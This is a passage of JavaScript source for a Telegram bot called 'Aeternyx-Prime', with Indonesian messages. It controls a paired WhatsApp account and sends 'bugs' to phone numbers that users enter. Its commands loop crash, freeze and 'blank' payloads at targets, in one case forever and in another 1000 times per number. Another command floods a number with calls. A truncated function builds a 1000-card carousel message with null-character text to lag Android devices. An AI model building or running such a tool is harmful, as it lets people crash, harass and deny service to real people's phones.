▣ Requested by  : @${Name} (ID: ${userId})
▣ Bug Type      : Spam UI
▣ Status        : Initializing...
▣ Progress      : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▣ Progress : [█░░░░░░░░░] 10%", delay: 800 },
    { text: "▣ Progress : [███░░░░░░░] 30%", delay: 600 },
    { text: "▣ Progress : [█████░░░░░] 50%", delay: 550 },
    { text: "▣ Progress : [███████░░░] 70%", delay: 600 },
    { text: "▣ Progress : [█████████░] 90%", delay: 700 },
    { text: "▣ Progress : [██████████] 100%", delay: 1000 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`Aeternyx-Prime
▣ Target        : ${q}
▣ Requested by  : @${Name} (ID: ${userId})
▣ Bug Type      : Spam UI
▣ Status        : Executing...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  await ctx.reply(
    `Konfirmasi Pengiriman Bug Ke \`${q}\`\n\nLanjutkan?`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Ya, Lanjutkan", callback_data: `confirm_spamui_yes_${q}_${userId}` },
            { text: "❌ Batal", callback_data: `confirm_spamui_no_${q}_${userId}` }
          ]
        ]
      }
    }
  );
});

bot.action(/confirm_spamui_yes_(\d+)_(\d+)/, async (ctx) => {
  const delay = getGlobalDelay();
  const q = ctx.match[1];
  const requesterId = ctx.match[2];
  const target = q + "@s.whatsapp.net";

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Memulai eksekusi...");

  console.log("\x1b[35m[AETERNYX SYSTEM] => Sending Spam UI...\x1b[0m");

  // ===== Fungsi spam UI ekstrem bisa kamu isi di sini =====
  (async () => {
    while (true) {
    console.log(chalk.yellow(`Aeternyx Sending Spam Ui to ${target}`));
      await natifui(target);
      await sleep(delay);
      await crashui(target);
      await sleep(delay);
      await CrL(target, Ptcp = true);
      await sleep(delay);
      await letterCrash(Prime, target, Ptcp = true);
      await sleep(delay);
      await LocUiNew(target, Ptcp = true);
      await sleep(delay);
      await UiScorpio(target);
      await sleep(delay);
      await blankprime2(target);
      await sleep(delay);
    }
  })();

  if (!ownerUsers.includes(Number(requesterId))) {
    setGlobalCooldown();
  }

  await ctx.editMessageText(
    `\`\`\`Aeternyx-Prime
▣ Target       : ${q}
▣ Requested by : @${ctx.from.username} (ID: ${ctx.from.id})
▣ Bug Type     : Spam UI
▣ Status       : ✅ Successfully
\`\`\`©QudXyrine`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.action(/confirm_spamui_no_(\d+)_(\d+)/, async (ctx) => {
  const requesterId = ctx.match[2];

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Dibatalkan.");
  await ctx.editMessageText(
    `⚠️ Pengiriman Bug SpamUi Dibatalkan Oleh @${ctx.from.username}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("blossomwave", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const argsRaw = ctx.message.text.split(" ").slice(1).join(" ");
  const targets = argsRaw.split(/[\s,]+/).filter(Boolean).map(num => num.replace(/[^0-9]/g, ""));
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  const Name = ctx.from.username;

  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }

  if (targets.length === 0) {
    return ctx.reply(`⚠️ Format salah, contoh:\n/blossomwave 628xxxx, 628yyyy 628zzzz`);
  }

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`⚡ Cooldown aktif! \nTunggu *${remainingTime} detik*`, {
      parse_mode: "Markdown",
    });
  }

  const targetJIDs = targets.map((num) => `${num}@s.whatsapp.net`);

  const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/jtv56b.jpg", {
    caption: `\`\`\`Aeternyx-Prime
▣ Target(s)     : ${targets.join(", ")}
▣ Requested by  : @${Name} (ID: ${userId})
▣ Bug Type      : BlossomWave
▣ Status        : Initializing...
▣ Progress      : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▣ Progress : [█░░░░░░░░░] 10%", delay: 800 },
    { text: "▣ Progress : [███░░░░░░░] 30%", delay: 600 },
    { text: "▣ Progress : [█████░░░░░] 50%", delay: 550 },
    { text: "▣ Progress : [███████░░░] 70%", delay: 600 },
    { text: "▣ Progress : [█████████░] 90%", delay: 700 },
    { text: "▣ Progress : [██████████] 100%", delay: 1000 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`Aeternyx-Prime
▣ Target(s)     : ${targets.join(", ")}
▣ Requested by  : @${Name} (ID: ${userId})
▣ Bug Type      : BlossomWave
▣ Status        : Executing...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  await ctx.reply(
    `Konfirmasi Pengiriman BlossomWave ke:\n\`${targets.join("`, `")}\`\n\nLanjutkan?`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Ya, Lanjutkan", callback_data: `confirm_blossom_yes_${targets.join("_")}_${userId}` },
            { text: "❌ Batal", callback_data: `confirm_blossom_no_${targets.join("_")}_${userId}` }
          ]
        ]
      }
    }
  );
});

bot.action(/confirm_blossom_yes_([\d_]+)_(\d+)/, async (ctx) => {
  const delay = getGlobalDelay();
  const raw = ctx.match[1];
  const requesterId = ctx.match[2];
  const targets = raw.split("_");
  const targetJIDs = targets.map(num => num + "@s.whatsapp.net");

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Memulai eksekusi...");

  console.log("\x1b[35m[AETERNYX SYSTEM] => Sending BlossomWave...\x1b[0m");

  (async () => {
    for (const target of targetJIDs) {
      for (let i = 0; i < 1000; i++) {
        await ButtonHardInvisible(target, true);
        await sleep(delay);
        await freeze(target, true);
        await sleep(delay);
        await ExtraKuota1GB(target);
        await sleep(delay);
        console.log(chalk.yellow(`Aeternyx Sending BlossomWave to ${target}`));
      }
    }
  })();

  if (!ownerUsers.includes(Number(requesterId))) {
    setGlobalCooldown();
  }

  await ctx.editMessageText(
    `\`\`\`Aeternyx-Prime
▣ Target(s)    : ${targets.join(", ")}
▣ Requested by : @${ctx.from.username} (ID: ${ctx.from.id})
▣ Bug Type     : BlossomWave
▣ Status       : ✅ Successfully
\`\`\`©QudXyrine`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 Cek Target", url: `https://wa.me/${targets[0]}` }],
        ],
      },
    }
  );
});

bot.action(/confirm_blossom_no_([\d_]+)_(\d+)/, async (ctx) => {
  const requesterId = ctx.match[2];

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Dibatalkan.");
  await ctx.editMessageText(
    `⚠️ Pengiriman BlossomWave Dibatalkan Oleh @${ctx.from.username}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("spam_call", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const args = ctx.message.text.trim().split(" ");
  const nomor = args[1];
  const jumlah = parseInt(args[2]);

  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  const Name = ctx.from.username;

  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }

  if (!nomor) {
    return ctx.reply(`⚠️ Format salah. Contoh:\n/spam_call 628xxxxxxxxxx 30`);
  }

  if (!jumlah || isNaN(jumlah) || jumlah <= 0) {
    return ctx.reply("⚠️ Masukkan jumlah call. Contoh: /spam_call ${nomor} 30");
  }

  if (!ownerUsers.includes(userId) && isOnGlobalCooldown()) {
    const remainingTime = getRemainingCooldown(userId);
    return ctx.reply(`⚡ Cooldown aktif! Tunggu *${formatTime(remainingTime)}*`, { parse_mode: "Markdown" });
  }

  const target = nomor.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/jtv56b.jpg", {
    caption: `\`\`\`Aeternyx-Prime
▣ Target        : ${nomor}
▣ Requested by  : @${Name} (ID: ${userId})
▣ Bug Type      : Spam Call
▣ Jumlah Call   : ${jumlah}
▣ Status        : Initializing...
▣ Progress      : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▣ Progress : [█░░░░░░░░░] 10%", delay: 800 },
    { text: "▣ Progress : [███░░░░░░░] 30%", delay: 600 },
    { text: "▣ Progress : [█████░░░░░] 50%", delay: 550 },
    { text: "▣ Progress : [███████░░░] 70%", delay: 600 },
    { text: "▣ Progress : [█████████░] 90%", delay: 700 },
    { text: "▣ Progress : [██████████] 100%", delay: 1000 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`Aeternyx-Prime
▣ Target        : ${nomor}
▣ Requested by  : @${Name} (ID: ${userId})
▣ Bug Type      : Spam Call
▣ Jumlah Call   : ${jumlah}
▣ Status        : Executing...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  await ctx.reply(`Konfirmasi spam call ke \`${nomor}\` sebanyak *${jumlah}x*?\n\nLanjutkan?`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Ya, Lanjutkan", callback_data: `confirm_spamcall_yes_${nomor}_${jumlah}_${userId}` },
          { text: "❌ Batal", callback_data: `confirm_spamcall_no_${nomor}_${userId}` }
        ]
      ]
    }
  });
});
bot.action(/confirm_spamcall_yes_(\d+)_(\d+)_(\d+)/, async (ctx) => {
  const delay = getGlobalDelay();
  const nomor = ctx.match[1];
  const jumlah = parseInt(ctx.match[2]);
  const requesterId = ctx.match[3];
  const target = nomor + "@s.whatsapp.net";

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau bukan pemanggil spam call ini", { show_alert: true });
  }

  await ctx.answerCbQuery("🚀 Memulai spam call...");

  await SpamCall(Prime, target, jumlah); // Fungsi spam call

  if (!ownerUsers.includes(Number(requesterId))) {
    setGlobalCooldown();
  }

  await ctx.editMessageText(
    `\`\`\`Aeternyx-Prime
▣ Target        : ${nomor}
▣ Requested by  : @${ctx.from.username}
▣ Bug Type      : Spam Call
▣ Jumlah Call   : ${jumlah}
▣ Status        : ✅ Successfully
\`\`\`©QudXyrine`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 Cek Target", url: `https://wa.me/${nomor}` }],
        ],
      },
    }
  );
});
bot.action(/confirm_spamcall_no_(\d+)_(\d+)/, async (ctx) => {
  const requesterId = ctx.match[2];

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kamu bukan pemanggil spam call ini", { show_alert: true });
  }

  await ctx.answerCbQuery("❌ Dibatalkan.");
  await ctx.editMessageText(
    `⚠️ Spam call dibatalkan oleh @${ctx.from.username}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("testdelay", async (ctx) => {
  const delay = getGlobalDelay();
  const delaySec = delay / 1000;

  await ctx.reply(`⏳ Delay: ${delaySec} detik`);

  await sleep(delay);

  await ctx.reply("✅ Delay selesai!");
});

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addprem", async (ctx) => {
  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }
  
  const args = ctx.message.text.split(" ");
  const Name = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
  const userId = ctx.from.id.toString();
  const commandName = "addprem";
  const access = loadCommandAccess();

  if (access.owneronly.includes(commandName) && !ownerUsers.includes(userId)) {
    return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini");
  }

  if (
    access.premiumonly.includes(commandName) &&
    !premiumUsers.includes(userId) &&
    !ownerUsers.includes(userId)
  ) {
    return ctx.reply("❌ Maaf, hanya user premium yang bisa menggunakan perintah ini");
  }

  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukin ID Nya Gblk !!\nContohnya Gini kntl: /addprem 57305916"
    );
  }
  
  const ID = args[1];

  if (premiumUsers.includes(ID)) {
    return ctx.reply(
      `✅ njir si kntl idiot ini ${ID} sudah memiliki status premium.`
    );
  }

  premiumUsers.push(ID);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `✅ njir si kntl Idiot ini ${ID} sudah memiliki status premium.`
  );
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command("delprem", async (ctx) => {
  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }
  
  const args = ctx.message.text.split(" ");
  const Name = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
  const userId = ctx.from.id.toString();
  const commandName = "delprem";
  const access = loadCommandAccess();

  if (access.owneronly.includes(commandName) && !ownerUsers.includes(userId)) {
    return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini");
  }

  if (
    access.premiumonly.includes(commandName) &&
    !premiumUsers.includes(userId) &&
    !ownerUsers.includes(userId)
  ) {
    return ctx.reply("❌ Maaf, hanya user premium yang bisa menggunakan perintah ini");
  }

  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan user id yang ingin dihapus dari premium.\nContoh: /delprem 123456789"
    );
  }

  const ID = args[1];

  if (!premiumUsers.includes(ID)) {
    return ctx.reply(`❌ Pengguna ${ID} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== ID);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Haha Mampus Lu ${ID} Di delprem etmin😹`);
});

bot.command("listprem", async (ctx) => {
  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }

  const userId = ctx.from.id.toString();
  const commandName = "listprem";
  const access = loadCommandAccess();

  if (access.owneronly.includes(commandName) && !ownerUsers.includes(userId)) {
    return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini");
  }

  if (
    access.premiumonly.includes(commandName) &&
    !premiumUsers.includes(userId) &&
    !ownerUsers.includes(userId)
  ) {
    return ctx.reply("❌ Maaf, hanya user premium yang bisa menggunakan perintah ini");
  }

  try {
    const premiumList = premiumUsers.length
      ? premiumUsers.map(id => `${id}`).join('\n')
      : "Tak de lah";

    await ctx.reply(`Daftar Premium:\n${premiumList}`);
  } catch (error) {
    console.error(error);
    await ctx.reply("⚠️ Gagal memuat daftar premium");
  }
});

bot.command("addsender", async (ctx) => {
  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }
  
  const args = ctx.message.text.split(' ').slice(1);
  const Name = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
  const userId = ctx.from.id.toString();
  const commandName = "addsender";
  const access = loadCommandAccess();

  if (access.owneronly.includes(commandName) && !ownerUsers.includes(userId)) {
    return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini");
  }

  if (
    access.premiumonly.includes(commandName) &&
    !premiumUsers.includes(userId) &&
    !ownerUsers.includes(userId)
  ) {
    return ctx.reply("❌ Maaf, hanya user premium yang bisa menggunakan perintah ini");
  }

  if (args.length < 1) {
    return await ctx.reply(
      "❌ Masukin nomor nya ngentot, Contoh nih mek /addsender <nomor_wa>"
    );
  }

  let phoneNumber = args[0];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (Prime && Prime.user) {
    return await ctx.reply("Santai Masih Aman!! Gass ajaa cik...");
  }

  try {
    const code = await Prime.requestPairingCode(phoneNumber, "AETEBETA");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto("https://files.catbox.moe/jtv56b.jpg", {
      caption: `
\`\`\`𝙰𝙴𝚃𝙴𝚁𝙽𝚈𝚇-𝙿𝚁𝙸𝙼𝙴
▢ 𝙁𝙤𝙧𝙢𝙖𝙩 𝘼𝙙𝙙𝙨𝙚𝙣𝙙𝙚𝙧 𝘼𝙣𝙙𝙖...
╰➤ 𝙉𝙤𝙢𝙤𝙧  : ${phoneNumber} 
╰➤ 𝙆𝙤𝙙𝙚   : ${formattedCode}
╰➤ 𝙋𝙚𝙢𝙞𝙣𝙩𝙖 : ${Name} (User Id : ${userId})
\`\`\`
`,

      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply(
      "❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS."
    );
  }
});
// Handler untuk tombol close
bot.action("close", async (ctx) => {
  try {
    const requester =
      ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;

    await ctx.editMessageCaption(
      `
\`\`\`𝙰𝙴𝚃𝙴𝚁𝙽𝚈𝚇-𝙿𝚁𝙸𝙼𝙴
▢ 𝙎𝙚𝙨𝙞 𝘿𝙞𝙩𝙪𝙩𝙪𝙥...
╰➤ 𝙉𝙤𝙢𝙤𝙧  : ❌ 𝘾𝙡𝙤𝙨𝙚𝙙
╰➤ 𝙆𝙤𝙙𝙚   : ❌ 𝘾𝙡𝙤𝙨𝙚𝙙
╰➤ 𝙋𝙚𝙢𝙞𝙣𝙩𝙖 : ${requester} (User Id : ${ctx.from.id})
\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [], // tombol dihapus
        },
      }
    );
  } catch (error) {
    console.error("Gagal Saat Mengedit puesan:", error);
    await ctx.answerCbQuery("error saat mengedit pesan.");
  }
});

// Load daftar owner dari file JSON
const ownerList = OWNER_ID;

function escapeMarkdownV2(text) {
  return text.replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
}

// Path ke folder sesi
const sessionFolder = path.join(__dirname, '聴覚');

// Fungsi bantu untuk membaca file owner setiap kali perintah dijalankan
function getOwnerUsers() {
  try {
    const raw = OWNER_ID; // misal: "123456789"
    const parsed = Array.isArray(raw)
      ? raw
      : typeof raw === 'string'
        ? [parseInt(raw)]
        : [];

    return parsed;
  } catch (err) {
    console.error('hm macam tak betul ni:', err);
    return [];
  }
}

// Perintah /delsesi
bot.command('delsesi', async (ctx) => {
  const userId = ctx.from.id;
  const ownerUsers = getOwnerUsers();
   
   if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }
  
  console.log(`User Id ${userId} mencoba akses /delsesi`);
  
  if (!ownerUsers.includes(userId)) {
    return ctx.reply(`lu gaada akses ${userId} karena lu bukan owner yee`);
  }

  try {
    if (!fs.existsSync(sessionFolder)) {
      return ctx.reply('nda nemu njir file sesinya');
    }

    const files = fs.readdirSync(sessionFolder);
    if (files.length === 0) {
      return ctx.reply('hm tidak ada file sesi yang perlu di hapus');
    }

    files.forEach(file => fs.unlinkSync(path.join(sessionFolder, file)));
    ctx.reply(`anjay semua sesi berhasil dihapus (${files.length} file).`);
  } catch (error) {
    console.error('ada kesalahan saat menghapus sesi:', error);
    ctx.reply('error pakcik');
  }
});

const commandAccessFile = path.join(DATABASE_DIR, "commandaccess.json");

function loadCommandAccess() {
  if (!fs.existsSync(commandAccessFile)) {
    fs.writeFileSync(commandAccessFile, JSON.stringify({ premiumonly: [], owneronly: [] }, null, 2));
  }
  return JSON.parse(fs.readFileSync(commandAccessFile));
}

function saveCommandAccess(data) {
  fs.writeFileSync(commandAccessFile, JSON.stringify(data, null, 2));
}

// Fungsi untuk load premium user dari file JSON
function getPremiumUsers() {
    try {
        const data = fs.readFileSync('./premiumuser.json', 'utf8');
        return JSON.parse(data);
    } catch (err) {
        console.error("Gagal membaca premiumuser.json:", err);
        return [];
    }
}

bot.command("status", async (ctx) => {
  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }
  
  const userId = ctx.from.id.toString();
  const commandName = "status";
  const access = loadCommandAccess();

  if (access.owneronly.includes(commandName) && !ownerUsers.includes(userId)) {
    return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini");
  }

  if (access.premiumonly.includes(commandName) && !premiumUsers.includes(userId) && !ownerUsers.includes(userId)) {
    return ctx.reply("❌ Maaf, hanya user premium yang bisa menggunakan perintah ini");
  }
  
  const connectedCount = isWhatsAppConnected ? 1 : 0;
  const connectedDevicesList = isWhatsAppConnected ? [linkedWhatsAppNumber] : [];

  let statusText;
  let inlineKeyboard;

  if (!isWhatsAppConnected || connectedDevicesList.length === 0) {
    statusText = `\`\`\`
  『 ✧ 𝚂𝚃𝙰𝚃𝚄𝚂 ⌁ 𝙱𝙾𝚃 ✧ 』
 ⟐ Info       : 0/1
 ⟐ Device List  : Kosong
 ⟐ Status     : ❌ Tidak Terhubung
\`\`\``;

    inlineKeyboard = [
      [{ text: "Reconnect", callback_data: "wa_reconnect" }]
    ];
  } else {
    const deviceList = connectedDevicesList
      .map((num, i) => `┃ #${i + 1}          : ${num}`)
      .join("\n");
    statusText = `\`\`\`
  『 ✧ 𝚂𝚃𝙰𝚃𝚄𝚂 ⌁ 𝙱𝙾𝚃 ✧ 』
 ⟐ Info       : ${connectedCount}/1
 ⟐ Device List  : 
${deviceList}
 ⟐ Status     : ✅ Terhubung
\`\`\``;

    inlineKeyboard = [
      [{ text: "Disconnect", callback_data: "wa_disconnect" }]
    ]; // Hanya tombol Disconnect tanpa Reconnect
  }

  const buttons = {
    reply_markup: {
      inline_keyboard: inlineKeyboard
    },
    parse_mode: "Markdown"
  };

  await ctx.reply(statusText, buttons);
});

bot.action("wa_disconnect", async (ctx) => {
  if (!ownerUsers.includes(ctx.from.id.toString())) {
    return ctx.answerCbQuery("❌ Hanya owner yang boleh melakukan ini", { show_alert: true });
  }

  if (!isWhatsAppConnected) {
    return ctx.answerCbQuery("❌ Tidak ada sesi untuk diputus");
  }

  try {
    await Prime.logout();
    isWhatsAppConnected = false;
    linkedWhatsAppNumber = "";
    await ctx.editMessageText("✅ Sesi WhatsApp berhasil *diputus*", { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Error saat disconnect:", err);
    await ctx.reply("⚠️ Gagal memutus koneksi");
  }
});

bot.action("wa_reconnect", async (ctx) => {
  if (!ownerUsers.includes(ctx.from.id.toString())) {
    return ctx.answerCbQuery("❌ Hanya owner yang boleh melakukan ini", { show_alert: true });
  }

  try {
    await ctx.answerCbQuery("Memulai ulang koneksi...");
    await startSesi();
    await ctx.editMessageText("✅ Berhasil mencoba *reconnect*", { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Error saat reconnect:", err);
    await ctx.reply("⚠️ Gagal melakukan reconnect");
  }
});

bot.command("setspeed", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const input = args[1];

  if (!input || !/^\d+(s|m|h|d)$/.test(input)) {
    return ctx.reply("⚠️ Format tidak valid. Contoh:\n/setspeed 5s | 1m | 2h | 1d");
  }

  const value = parseInt(input.slice(0, -1));
  const unit = input.slice(-1);
  let ms;

  switch (unit) {
    case 's': ms = value * 1000; break;
    case 'm': ms = value * 60 * 1000; break;
    case 'h': ms = value * 60 * 60 * 1000; break;
    case 'd': ms = value * 24 * 60 * 60 * 1000; break;
    default: return ctx.reply("⚠️ Unit waktu tidak valid.");
  }

  const speedFile = path.join(DATABASE_DIR, "speed.json");
  fs.writeFileSync(speedFile, JSON.stringify({ delay: ms }, null, 2));
  return ctx.reply(`✅ Delay global diatur ke ${input} (${ms} ms)`);
});

bot.command('info', (ctx) => {
  const replyMessage = ctx.message.reply_to_message;
  const chat = ctx.chat;
  const user = ctx.from;

  const escape = escapeMarkdownV2;

  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }
  
  if (chat.type === 'private') {
    // Private chat → tampilkan info pengguna
    const userId = escape(user.id.toString());
    const name = escape(user.first_name || 'N/A');
    const username = user.username ? escape(`@${user.username}`) : '_No username_';

    ctx.reply(
      `*Your Info:*\n` +
      `• ID: \`${userId}\`\n` +
      `• Name: ${name}\n` +
      `• Username: ${username}`,
      { parse_mode: 'MarkdownV2' }
    );
  } else if (chat.type === 'group' || chat.type === 'supergroup') {
    if (replyMessage) {
      // Di grup + mereply pesan → tampilkan info user yang di-reply
      const repliedUser = replyMessage.from;
      const userId = escape(repliedUser.id.toString());
      const name = escape(repliedUser.first_name || 'N/A');
      const username = repliedUser.username ? escape(`@${repliedUser.username}`) : '_No username_';

      ctx.reply(
        `*User Info:*\n` +
        `• ID: \`${userId}\`\n` +
        `• Name: ${name}\n` +
        `• Username: ${username}`,
        { parse_mode: 'MarkdownV2' }
      );
    } else {
      // Di grup + tidak mereply → tampilkan info grup
      const chatId = escape(chat.id.toString());
      const title = escape(chat.title || 'Unnamed Group');
      const chatType = escape(chat.type); // 'group' atau 'supergroup'

      ctx.reply(
        `*Group Info:*\n` +
        `• Title: ${title}\n` +
        `• Type: \`${chatType}\`\n` +
        `• ID: \`${chatId}\``,
        { parse_mode: 'MarkdownV2' }
      );
    }
  } else if (chat.type === 'channel') {
    // Channel → tampilkan info channel
    const chatId = escape(chat.id.toString());
    const title = escape(chat.title || 'Unnamed Channel');
    const username = chat.username ? escape(`@${chat.username}`) : '_No username_';

    ctx.reply(
      `*Channel Info:*\n` +
      `• Title: ${title}\n` +
      `• Username: ${username}\n` +
      `• ID: \`${chatId}\``,
      { parse_mode: 'MarkdownV2' }
    );
  } else {
    ctx.reply('Unable to retrieve info.');
  }
});
// Function Delay Android
async function PhotoDelay(target) {
   let ambaloop = 10;

  for (let i = 0; i < ambaloop; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 5; i++) {
    buttt.push({
    "name": "galaxy_message",
    "buttonParamsJson": JSON.stringify({
          "header": "null",
          "body": "xxx",
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 1000; i++) {
      push.push({
        "body": {
         "text": "༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟💥͡" 
        },
        "footer": {
          "text": ""
        },
        "header": {
          "title": '🐉',
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "\u0000\u0000\u0000\u0000"
            },
            "footer": {
              "text": "🩸༑𝐀𝐞𝐭𝐞𝐫𝐧𝐲𝐱͢⟡𝐕𝐨𝐱⃟〽️"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
